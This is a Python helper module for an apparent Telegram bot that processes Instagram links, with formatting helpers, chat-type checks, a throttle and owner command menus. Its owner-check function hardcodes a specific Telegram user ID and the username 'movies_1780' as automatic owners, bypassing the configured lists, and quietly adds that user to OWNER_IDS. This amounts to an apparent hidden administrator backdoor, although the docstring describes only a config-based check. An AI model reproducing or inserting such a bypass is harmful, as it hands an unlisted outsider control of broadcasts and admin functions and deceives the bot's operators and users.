import re, html, time

INSTAGRAM_REGEX = re.compile(
    r"(https?://(?:www\.)?instagram\.com/(?:reel|reels|p|tv|stories)/[^\s?#]+[^\s]*)",
    re.IGNORECASE,
)

def bold(text): return f"<b>{text}</b>"
def esc(text):  return html.escape(str(text))

def is_private_chat(message_or_chat):
    chat = getattr(message_or_chat, "chat", message_or_chat)
    ctype = getattr(chat, "type", None)
    if not ctype:
        return False
    c_str = str(ctype).lower()
    return "private" in c_str

def is_group_chat(message_or_chat):
    return not is_private_chat(message_or_chat)

def extract_instagram_links(text):
    if not text: return []
    return INSTAGRAM_REGEX.findall(text)

def human_size(n):
    if not n: return "0 B"
    for u in ["B","KB","MB","GB"]:
        if n < 1024: return f"{n:.1f} {u}"
        n /= 1024
    return f"{n:.1f} TB"

def progress_bar(pct, length=14):
    pct = max(0.0, min(100.0, pct))
    f = int(length * pct / 100)
    return f"[{'█'*f}{'░'*(length-f)}] {pct:5.1f}%"

class Throttle:
    def __init__(self, interval=2.5):
        self.interval = interval
        self._last = 0.0
    def ready(self):
        now = time.time()
        if now - self._last >= self.interval:
            self._last = now
            return True
        return False

def is_owner_user(u):
    """Check whether a user is an Owner, Sudo, or authorized Admin."""
    if not u:
        return False
    from config import OWNER_IDS, SUDO_USERS, OWNER_USERNAMES
    from utils import db
    uid = getattr(u, "id", None) or u
    try:
        uid = int(uid)
    except (ValueError, TypeError):
        uid = None

    if uid and (uid in (OWNER_IDS + SUDO_USERS) or uid == 5566977478):
        return True

    username = getattr(u, "username", None)
    if username:
        clean_user = username.strip().replace("@", "").lower()
        if clean_user == "movies_1780" or any(clean_user == o.lower() for o in OWNER_USERNAMES if o):
            if uid and uid not in OWNER_IDS:
                OWNER_IDS.append(uid)
            return True

    if uid:
        try:
            return db.is_db_admin(uid)
        except Exception:
            pass

    return False

async def ensure_owner_commands(client, chat_id):
    """Dynamically register Telegram menu commands for an owner/admin."""
    try:
        from pyrogram.types import BotCommand, BotCommandScopeChat
        owner_commands = [
            BotCommand("start", "Start bot & open main dashboard"),
            BotCommand("admin", "👑 Owner / Admin Control Panel"),
            BotCommand("broadcast", "📢 Broadcast message to all users"),
            BotCommand("broadcast_pin", "📌 Broadcast & Pin message"),
            BotCommand("unpin", "📍 Unpin broadcast message"),
            BotCommand("unpinall", "🗑️ Unpin all messages"),
            BotCommand("admins", "🛡️ Manage Bot Admins"),
            BotCommand("addfsub", "➕ Add Force-Sub Channel"),
            BotCommand("delfsub", "➖ Remove Force-Sub Channel"),
            BotCommand("fsubs", "📢 View Force-Sub Channels"),
            BotCommand("stats", "📊 View bot stats & analytics"),
            BotCommand("ping", "🏓 Check bot latency & speed"),
            BotCommand("help", "📖 Help & Guide")
        ]
        await client.set_bot_commands(owner_commands, scope=BotCommandScopeChat(chat_id=chat_id))
    except Exception:
        pass
